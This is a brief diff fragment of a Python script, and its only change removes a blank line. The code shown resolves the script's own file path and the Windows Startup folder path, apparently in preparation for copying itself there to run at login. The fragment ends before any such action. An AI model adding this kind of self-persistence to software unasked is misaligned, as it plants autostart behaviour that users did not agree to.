@@ -3,7 +3,6 @@ import os
 import shutil
 from pathlib import Path
 import sys
-
 current_file_path = os.path.abspath(sys.argv[0])
 
 startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
